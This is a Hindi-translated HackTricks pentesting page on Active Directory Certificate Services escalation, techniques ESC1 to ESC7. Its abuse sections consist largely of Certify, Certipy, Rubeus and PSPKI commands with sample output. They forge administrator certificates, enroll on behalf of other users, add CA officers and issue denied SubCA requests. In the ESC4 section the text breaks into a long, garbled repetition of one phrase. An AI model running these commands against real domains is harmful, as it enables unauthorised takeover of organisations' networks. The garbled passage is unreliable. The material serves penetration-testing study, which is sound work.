# AD CS डोमेन उन्नयन

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें**.
* **अपने हैकिंग ट्रिक्स को** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में पीआर जमा करके** अपना योगदान दें।

</details>

## गलत रूप से कॉन्फ़िगर किए गए प्रमाणपत्र टेम्पलेट - ESC1

### स्पष्टीकरण

* **एंटरप्राइज CA** निम्न-अधिकारीय उपयोगकर्ताओं को पंजीकरण के अधिकार प्रदान करता है
* **प्रबंधक स्वीकृति अक्षम है**
* **कोई अधिकृत हस्ताक्षर की आवश्यकता नहीं होती है**
* एक अत्यधिक परवर्ती **प्रमाणपत्र टेम्पलेट सुरक्षा विवरण** निम्न-अधिकारीय उपयोगकर्ताओं को प्रमाणपत्र पंजीकरण के अधिकार प्रदान करता है
* **प्रमाणपत्र टेम्पलेट एकीकृत कर्मचारी पहचान को सक्षम करने वाले EKU को परिभाषित करता है**:
* _ग्राहक प्रमाणीकरण (OID 1.3.6.1.5.5.7.3.2), PKINIT ग्राहक प्रमाणीकरण (1.3.6.1.5.2.3.4), स्मार्ट कार्ड लॉगऑन (OID 1.3.6.1.4.1.311.20.2.2), कोई उद्देश्य (OID 2.5.29.37.0), या कोई EKU नहीं (SubCA)।_
* **प्रमाणपत्र टेम्पलेट अनुरोधकर्ताओं को CSR में subjectAltName निर्दिष्ट करने की अनुमति देता है:**
* **AD** एक प्रमाणपत्र के **subjectAltName** (SAN) फ़ील्ड द्वारा निर्दिष्ट पहचान का उपयोग करेगा **अगर** यह **मौजूद** है। इसलिए, यदि एक अनुरोधकर्ता एक CSR में SAN निर्दिष्ट कर सकता है, तो अनुरोधकर्ता किसी भी व्यक्ति के रूप में प्रमाणपत्र का अनुरोध कर सकता है (उदाहरण के लिए, एक डोमेन व्यवस्थापक उपयोगकर्ता)। प्रमाणपत्र टेम्पलेट का AD ऑब्जेक्ट निर्दिष्ट करता है कि अनुरोधकर्ता क्या संदर्भAltName को निर्दिष्ट कर सकता है इसके **`mspki-certificate-name-`**`flag` संपत्ति। `mspki-certificate-name-flag` संपत्ति एक **बिटमास्क** है और यदि **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** झंडा **मौजूद** है, तो एक अनुरोधकर्ता संदर्भAltName को निर्दिष्ट कर सकता है।

{% hint style="danger" %}
ये सेटिंग्स एक **निम्न-अधिकारीय उपयोगकर्ता को एक अनियमित SAN के साथ प्रमाणपत्र का अनुरोध करने की अनुमति देती हैं**, जिससे निम्न-अधिकारीय उपयोगकर्ता Kerberos या SChannel के माध्यम से डोमेन में किसी भी प्रमुख के रूप में प्रमाणित हो सकता है।
{% endhint %}

यह अक्सर सक्षम किया जाता है, उदाहरण के लिए, HTTPS प्रमाणपत्र उत्पन्न करने या प्रमाणपत्रों को फ्लाई पर होस्ट करने के लिए उत्पादों या डिप्लॉयमेंट सेवाओं को अनुमति देने के लिए। या ज्ञान की कमी के कारण।

ध्यान दें कि जब इस अंतिम विकल्प के साथ एक प्रमाणपत्र बनाया जाता है, तो एक **चेतावनी प्रदर्शित होती है**, लेकिन यह चेतावनी प्रदर्शित नहीं होती है यदि एक **प्रमाणपत्र टेम्पलेट** इस कॉन्फ़िगरेशन के साथ **डुप्लिकेट** की जाती है (जैसे `WebServer` टेम्पलेट जिसमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` सक्षम है और फिर प्रशासक एक प्रमाणीकरण OID जोड़ सकता है)।

### दुरुपयोग

**विकल्प प्रमाणपत्र टेम्पलेट खोजने** के लिए आप निम्नलिखित को चला सकते हैं:
```bash
Certify.exe find /vulnerable
certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
```
इस कमजोरी का दुरुपयोग करके एक प्रशासक की भूमिका में अभिनय करने के लिए निम्नलिखित को चला सकते हैं:
```bash
Certify.exe request /ca:dc.theshire.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
तब आप उत्पन्न **प्रमाणपत्र को `.pfx`** प्रारूप में परिवर्तित कर सकते हैं और फिर से Rubeus या certipy का उपयोग करके प्रमाणीकरण के लिए उपयोग कर सकते हैं:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
विंडोज बाइनरी "Certreq.exe" और "Certutil.exe" का दुरुपयोग करके PFX उत्पन्न किया जा सकता है: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

इसके अलावा, AD फ़ॉरेस्ट के कॉन्फ़िगरेशन स्कीमा के खिलाफ चलाए जाने वाले निम्नलिखित LDAP क्वेरी का उपयोग करके **प्रमाणपत्र टेम्पलेट** की **सूचीकरण** किया जा सकता है जो **मंजूरी / हस्ताक्षर की आवश्यकता नहीं है**, जिनमें **क्लाइंट प्रमाणीकरण या स्मार्ट कार्ड लॉगऑन EKU** होता है, और **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** फ़्लैग सक्षम होता है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## गलत रूप से कॉन्फ़िगर किए गए प्रमाणपत्र टेम्पलेट - ESC2

### स्पष्टीकरण

दूसरी दुरुपयोग स्थिति पहली स्थिति का एक रूपांतरण है:

1. एंटरप्राइज CA कम-अधिकारी उपयोगकर्ताओं को पंजीकरण अधिकार प्रदान करता है।
2. प्रबंधक स्वीकृति अक्षम की जाती है।
3. कोई अधिकृत हस्ताक्षर की आवश्यकता नहीं होती है।
4. एक अत्यधिक अनुमति वाला प्रमाणपत्र टेम्पलेट सुरक्षा विवरणकर्ता कम-अधिकारी उपयोगकर्ताओं को प्रमाणपत्र पंजीकरण अधिकार प्रदान करता है।
5. **प्रमाणपत्र टेम्पलेट ने किसी भी उद्देश्य EKU या कोई EKU परिभाषित किया है।**

**किसी भी उद्देश्य EKU** एक हमलावर्धक को **क्लाइंट प्रमाणीकरण**, **सर्वर प्रमाणीकरण**, **कोड साइनिंग** आदि के लिए **प्रमाणपत्र** प्राप्त करने की अनुमति देता है। इसका उपयोग करके इसका दुरुपयोग करने के लिए **ESC3 के लिए तकनीक** का उपयोग किया जा सकता है।

**कोई EKU वाला प्रमाणपत्र** - एक अधीनस्थ CA प्रमाणपत्र - भी **किसी भी उद्देश्य** के लिए दुरुपयोग किया जा सकता है, लेकिन इसका उपयोग **नए प्रमाणपत्रों के लिए हस्ताक्षर करने** के लिए भी किया जा सकता है। इस प्रकार, एक अधीनस्थ CA प्रमाणपत्र का उपयोग करके, एक हमलावर्धक नए प्रमाणपत्रों में **विचित्र EKU या क्षेत्रों को निर्दिष्ट** कर सकता है।

हालांकि, यदि **अधीनस्थ CA को विश्वसनीय** नहीं माना जाता है **`NTAuthCertificates`** वस्तु द्वारा (जो डिफ़ॉल्ट रूप से नहीं होगा), तो हमलावर्धक **नए प्रमाणपत्र** नहीं बना सकता है जो **डोमेन प्रमाणीकरण** के लिए काम करेंगे। फिर भी, हमलावर्धक किसी भी EKU के साथ **नए प्रमाणपत्र** और विचित्र प्रमाणपत्र मानों को बना सकता है, जिनमें संभावित रूप से बहुत सारे हमलावर्धक का दुरुपयोग किया जा सकता है (जैसे कोड साइनिंग, सर्वर प्रमाणीकरण, आदि) और नेटवर्क में अन्य अनुप्रयोगों के लिए बड़े प्रभाव हो सकते हैं जैसे SAML, AD FS, या IPSec।

इस स्थिति के मिलते-जुलते टेम्पलेटों की जांच के लिए AD फ़ॉरेस्ट के कॉन्फ़िगरेशन स्कीमा के खिलाफ निम्नलिखित LDAP क्वेरी का उपयोग किया जा सकता है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## गलत ढंग से कॉन्फ़िगर किए गए एनरोलमेंट एजेंट टेम्पलेट्स - ESC3

### स्पष्टीकरण

यह परिदृश्य पहले और दूसरे जैसा ही है, लेकिन इसमें एक **अलग EKU** (सर्टिफिकेट अनुरोध एजेंट) और **2 अलग टेम्पलेट** (इसलिए इसमें 2 सेट की आवश्यकताएं होती हैं) का **दुरुपयोग** किया जाता है।

**सर्टिफिकेट अनुरोध एजेंट EKU** (OID 1.3.6.1.4.1.311.20.2.1), माइक्रोसॉफ्ट दस्तावेज़ीकरण में **एनरोलमेंट एजेंट** के रूप में जाना जाता है, एक प्रधान को एक अन्य उपयोगकर्ता के लिए सर्टिफिकेट के लिए **एनरोल** करने की अनुमति देता है।

**"एनरोलमेंट एजेंट"** इस तरह के एक **टेम्पलेट** में एनरोल होता है और परिणामस्वरूप **सर्टिफिकेट का उपयोग करके दूसरे उपयोगकर्ता के लिए CSR को-साइन करता है**। फिर यह **को-साइन किए गए CSR** को सीए को भेजता है, जो एक **"दूसरे" उपयोगकर्ता** के सर्टिफिकेट के साथ प्रतिक्रिया करता है।

**आवश्यकताएं 1:**

1. एंटरप्राइज CA कम-अधिकारी उपयोगकर्ताओं को एनरोलमेंट अधिकार देता है।
2. प्रबंधक स्वीकृति अक्षम है।
3. कोई अधिकृत हस्ताक्षर की आवश्यकता नहीं होती है।
4. एक अत्यधिक अनुमति वाला सर्टिफिकेट टेम्पलेट सुरक्षा विवरणकारक कम-अधिकारी उपयोगकर्ताओं को सर्टिफिकेट एनरोलमेंट अधिकार देता है।
5. **सर्टिफिकेट टेम्पलेट सर्टिफिकेट अनुरोध एजेंट EKU** को परिभाषित करता है। सर्टिफिकेट अनुरोध एजेंट OID (1.3.6.1.4.1.311.20.2.1) अन्य प्रधानों के लिए सर्टिफिकेट टेम्पलेट का अनुरोध करने की अनुमति देता है।

**आवश्यकताएं 2:**

1. एंटरप्राइज CA कम-अधिकारी उपयोगकर्ताओं को एनरोलमेंट अधिकार देता है।
2. प्रबंधक स्वीकृति अक्षम है।
3. **टेम्पलेट स्कीमा संस्करण 1 है या 2 से अधिक है और सर्टिफिकेट अनुरोध एजेंट EKU की आवश्यकता रखता है।**
4. सर्टिफिकेट टेम्पलेट एक EKU परिभाषित करता है जो डोमेन प्रमाणीकरण के लिए अनुमति देता है।
5. एनरोलमेंट एजेंट प्रतिबंध CA पर लागू नहीं होते हैं।

### दुरुपयोग

आप इस परिदृश्य का दुरुपयोग करने के लिए [**Certify**](https://github.com/GhostPack/Certify) या [**Certipy**](https://github.com/ly4k/Certipy) का उपयोग कर सकते हैं:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:CORPDC01.CORP.LOCAL\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req 'corp.local/john:Pass0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
एंटरप्राइज CAs उन उपयोगकर्ताओं को **सीमित कर सकते हैं** जो एक **एनरोलमेंट एजेंट प्रमाणपत्र** प्राप्त कर सकते हैं, उन **टेम्पलेट्स में एनरोल कर सकते हैं**, और जिन **खातों** पर एनरोलमेंट एजेंट कार्रवाई कर सकते हैं, इसके लिए `certsrc.msc` `स्नैप-इन खोलें -> CA पर दायां क्लिक करें -> संपत्तियों पर क्लिक करें -> "एनरोलमेंट एजेंट्स" टैब में जाएं।

हालांकि, **डिफ़ॉल्ट** CA सेटिंग "एनरोलमेंट एजेंट्स की सीमा न करें" है। यहां तक कि जब व्यवस्थापक "एनरोलमेंट एजेंट्स की सीमा लगाएं" सक्षम करते हैं, डिफ़ॉल्ट सेटिंग बहुत अनुमतिपूर्ण होती है, जो हर किसी को सभी टेम्पलेट्स में प्रवेश देती है।

## वंशीय प्रमाणपत्र पहुंच नियंत्रण में कमजोरी - ESC4

### **स्पष्टीकरण**

**प्रमाणपत्र टेम्पलेट** में एक **सुरक्षा विवरण** होता है जो निर्दिष्ट करता है कि कौन से AD **प्रिंसिपल्स** के पास टेम्पलेट पर विशेष **अनुमतियाँ हैं**।

यदि एक **हमलावर** को पर्याप्त **अनुमतियाँ** होती हैं ताकि वह एक **टेम्पलेट** को **संशोधित** कर सके और **पिछले खंडों** से किसी भी उत्पादनीय **गलतियों** को बना सके, तो उसे इसका शोषण करने और **वंशीकरण अधिकार** को बढ़ाने की क्षमता होगी।

प्रमाणपत्र टेम्पलेटों पर दिलचस्प अधिकार:

* **स्वामी:** वस्तु का निर्देशित पूर्ण नियंत्रण, किसी भी गुणों को संपादित कर सकता है।
* **पूर्ण नियंत्रण:** वस्तु का पूर्ण नियंत्रण, किसी भी गुणों को संपादित कर सकता है।
* **लेखक लिखें:** हमलावर नियंत्रित प्रमुखलब्ध के लिए मालिक को संशोधित कर सकता है।
* **Dacl लिखें:** हमलावर को पूर्ण नियंत्रण प्रदान करने के लिए पहुंच नियंत्रण संशोधित कर सकता है।
* **संपत्ति लिखें:** किसी भी गुणों को संपादित कर सकता है

### दुरुपयोग

पिछले उदाहरण की तरह एक प्राइवेस्क उदाहरण:

<figure><img src="../../../.gitbook/assets/image (15) (2).png" alt=""><figcaption></figcaption></figure>

ESC4 ऐसा होता है जब एक उपयोगकर्ता के पास प्रमाणपत्र टेम्पलेट पर लेखन अधिकार होते हैं। इसे उदाहरण के लिए इस्तेमाल किया जा सकता है कि प्रमाणपत्र टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के लिए टेम्पलेट की विन्यास को ओवरराइट करने के ल
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## विकल्पनीय पीकेआई ऑब्जेक्ट ऍक्सेस कंट्रोल - ESC5

### स्पष्टीकरण

एडी सीएस की सुरक्षा पर प्रभाव डालने वाले कई प्रमाणपत्र टेम्पलेट और प्रमाणपत्र प्राधिकरण के बाहर के ऑब्जेक्ट्स के बीच जुड़े हुए एसीएल आधारित संबंधों का जाल व्यापक है। ये संभावनाएं शामिल हैं (लेकिन इनसे सीमित नहीं हैं):

* सीए सर्वर का एडी कंप्यूटर ऑब्जेक्ट (यानी, S4U2Self या S4U2Proxy के माध्यम से संकट)
* सीए सर्वर का आरपीसी / डीकॉम सर्वर
* कंटेनर में किसी भी वंशज एडी ऑब्जेक्ट या कंटेनर (उदाहरण के लिए, प्रमाणपत्र टेम्पलेट कंटेनर, प्रमाणपत्र प्राधिकरण कंटेनर, NTAuthCertificates ऑब्जेक्ट, नामांकन सेवा कंटेनर, आदि)

यदि किसी कम अधिकारी द्वारा इनमें से किसी को नियंत्रण प्राप्त हो सकता है, तो हमला संभावित रूप से पीकेआई प्रणाली को प्रभावित कर सकता है।

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### स्पष्टीकरण

एक और समस्या है, जिसे [**CQure Academy पोस्ट**](https://cqureacademy.com/blog/enhanced-key-usage) में वर्णित किया गया है, जिसमें **`EDITF_ATTRIBUTESUBJECTALTNAME2`** फ़्लैग शामिल है। माइक्रोसॉफ्ट के अनुसार, "यदि" इस फ़्लैग को सीए पर सेट किया जाता है, "किसी भी अनुरोध (सक्रिय निर्माण से विषय बनाया जाता है) में उपयोगकर्ता परिभाषित मान विषय वैकल्पिक नाम में हो सकते हैं।" इसका अर्थ है कि एक हमलावर किसी भी टेम्पलेट में नामांकित हो सकता है जो डोमेन प्रमाणीकरण के लिए कॉन्फ़िगर किया गया है और जिसमें अनधिकृत उपयोगकर्ताओं को नामांकित करने की अनुमति है (उदाहरण के लिए, डिफ़ॉल्ट उपयोगकर्ता टेम्पलेट) और हमें एक प्रमाणपत्र प्राप्त करने की अनुमति देता है जिसके द्वारा हम डोमेन व्यवस्थापक के रूप में प्रमाणित कर सकते हैं (या किसी अन्य सक्रिय उपयोगकर्ता / मशीन के रूप में)।

**नोट**: यहां वैकल्पिक नाम सीएसआर के माध्यम से `-attrib "SAN:"` तर्क के माध्यम से सीएसआर में शामिल होते हैं (यानी, "नाम मान जोड़ी")। यह ESC1 में SAN का दुरुपयोग करने की विधि से अलग है क्योंकि इसमें प्रमाणपत्र विस्तार के बजाय प्रमाणपत्र गुणवत्ता में खाता जानकारी संग्रहित की जाती है।

### दुरुपयोग

संगठन निम्नलिखित `certutil.exe` कमांड का उपयोग करके जांच सकता है कि क्या सेटिंग सक्षम है:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
नीचे, यह केवल **दूरस्थ** **रजिस्ट्री** का उपयोग करता है, इसलिए निम्नलिखित कमांड भी काम कर सकती है:
```
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify) और [**Certipy**](https://github.com/ly4k/Certipy) भी इसे जांचते हैं और इस गलत कॉन्फ़िगरेशन का दुरुपयोग करने के लिए उपयोग किया जा सकता है:
```bash
# Check for vulns, including this one
Certify.exe find

# Abuse vuln
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
ये सेटिंग्स किसी भी सिस्टम से **सेट** की जा सकती हैं, मान लें **डोमेन प्रशासनिक** (या समकक्ष) अधिकार हों।
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
यदि आप अपने पर्यावरण में इस सेटिंग को पाते हैं, तो आप इस ध्वज को हटा सकते हैं:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
मई 2022 सुरक्षा अपडेट के बाद, नए **प्रमाणपत्र** में एक **सुरक्षा एक्सटेंशन** होगा जो **अनुरोधकर्ता की `objectSid` गुणधर्म** को **एम्बेड** करेगा। ESC1 के लिए, यह गुणधर्म निर्दिष्ट किए गए SAN से प्रतिबिंबित होगा, लेकिन **ESC6** के साथ, यह गुणधर्म अनुरोधकर्ता की `objectSid` को प्रतिबिंबित करेगा, और SAN से नहीं।\
इस प्रकार, **ESC6 का दुरुपयोग करने के लिए**, पर्यावरण को **ESC10 के प्रति संक्रमित** होना चाहिए (कमजोर प्रमाणपत्र मैपिंग), जहां नई सुरक्षा एक्सटेंशन की बजाय SAN को प्राथमिकता दी जाती है।
{% endhint %}

## संक्रमित प्रमाणपत्र प्राधिकरण पहुंच नियंत्रण - ESC7

### हमला 1

#### स्पष्टीकरण

प्रमाणपत्र प्राधिकरण खुद में विभिन्न **CA क्रियाएं सुरक्षित करने वाली अनुमतियों** का एक **सेट** होता है। इन अनुमतियों को `certsrv.msc` से पहुंचा जा सकता है, CA पर दायां क्लिक करके गुणवत्ता विशेषता का चयन करके सुरक्षा टैब पर स्विच करके:

<figure><img src="../../../.gitbook/assets/image (73) (2).png" alt=""><figcaption></figcaption></figure>

इसे [**PSPKI के मॉड्यूल**](https://www.pkisolutions.com/tools/pspki/) के माध्यम से भी गणना की जा सकती है, `Get-CertificationAuthority | Get-CertificationAuthorityAcl` के साथ:
```bash
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-certificationAuthorityAcl | select -expand Access
```
यहाँ दो मुख्य अधिकार हैं, जो "CA प्रशासक" और "प्रमाणपत्र प्रबंधक" के लिए होते हैं।

#### दुरुपयोग

यदि आपके पास किसी प्रमाणपत्र प्राधिकरण पर "ManageCA" अधिकार वाला मुख्य है, तो हम **PSPKI** का उपयोग करके दूरस्थ रूप से **`EDITF_ATTRIBUTESUBJECTALTNAME2`** बिट को फ्लिप कर सकते हैं ताकि किसी भी टेम्पलेट में **SAN स्पष्टीकरण** की अनुमति मिले ([ECS6](domain-escalation.md#editf\_attributesubjectaltname2-esc6)):

<figure><img src="../../../.gitbook/assets/image (1) (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (70) (2).png" alt=""><figcaption></figcaption></figure>

इसे [**PSPKI के Enable-PolicyModuleFlag**](https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx) cmdlet के साथ एक सरल रूप में भी संभव है।

**`ManageCertificates`** अधिकार प्रमाणित करता है कि **एक लंबित अनुरोध को मंजूरी दी जा सकती है**, इसलिए "CA प्रमाणपत्र प्रबंधक मंजूरी" सुरक्षा को छलना करता है।

आप **Certify** और **PSPKI** मॉड्यूल का एक संयोजन उपयोग करके प्रमाणपत्र का अनुरोध कर सकते हैं, इसे मंजूरी दे सकते हैं और इसे डाउनलोड कर सकते हैं:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.theshire.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.theshire.local\theshire-DC-CA /id:336
```
### हमला 2

#### स्पष्टीकरण

{% hint style="warning" %}
पिछले हमले में, **`Manage CA`** अनुमति का उपयोग करके **EDITF\_ATTRIBUTESUBJECTALTNAME2** फ़्लैग को सक्षम करने के लिए **ESC6 हमला** किया गया था, लेकिन इसका कोई प्रभाव नहीं होगा जब तक CA सेवा (`CertSvc`) को पुनरारंभ नहीं किया जाता है। जब एक उपयोगकर्ता के पास `Manage CA` उपयोगकर्ता अधिकार होते हैं, तो उपयोगकर्ता को सेवा को पुनरारंभ करने की अनुमति भी होती है। हालांकि, इसका अर्थ यह नहीं है कि उपयोगकर्ता सेवा को दूरस्थ रूप से पुनरारंभ कर सकता है। इसके अलावा, बहुत से पैच किए गए पर्यावरणों में मई 2022 के सुरक्षा अपडेट के कारण ESC6 ठीक से काम नहीं कर सकता है।
{% endhint %}

इसलिए, यहां एक और हमला प्रस्तुत किया जाता है।

पूर्वापेक्षाएं:

* केवल **`ManageCA` अनुमति**
* **`Manage Certificates`** अनुमति (यह **`ManageCA`** से प्रदान की जा सकती है)
* प्रमाणपत्र टेम्पलेट **`SubCA`** को **सक्षम** होना चाहिए (इसे **`ManageCA`** से सक्षम किया जा सकता है)

यह तकनीक उस तथ्य पर आश्रित है कि `Manage CA` और `Manage Certificates` उपयोगकर्ता अधिकार वाले उपयोगकर्ता **विफल प्रमाणपत्र अनुरोध** जारी कर सकते हैं। **`SubCA`** प्रमाणपत्र टेम्पलेट **ESC1 के लिए संकटग्रस्त** है, लेकिन **केवल प्रशासक** ही टेम्पलेट में नामांकित हो सकते हैं। इस प्रकार, एक **उपयोगकर्ता** टेम्पलेट में नामांकित होने के लिए **अनुरोध** कर सकता है - जो **अस्वीकारित** होगा - लेकिन **फिर प्रबंधक द्वारा जारी** किया जाएगा।

#### दुरुपयोग

आप अपने उपयोगकर्ता को एक नए अधिकारी के रूप में जोड़कर खुद को **`Manage Certificates` उपयोगकर्ता अधिकार** प्रदान कर सकते हैं।
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** टेम्पलेट को `-enable-template` पैरामीटर के साथ **सीए पर सक्षम किया जा सकता है**। डिफ़ॉल्ट रूप से, `SubCA` टेम्पलेट सक्षम होता है।
```bash
# List templates
certipy ca 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
यदि हमने इस हमले के लिए पूर्वापेक्षाएं पूरी की हैं, तो हम **`SubCA` टेम्पलेट पर आधारित प्रमाणपत्र का अनुरोध करके शुरू कर सकते हैं**।

**यह अनुरोध अस्वीकार किया जाएगा**, लेकिन हम निजी कुंजी को सहेजेंगे और अनुरोध आईडी को नोट करेंगे।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
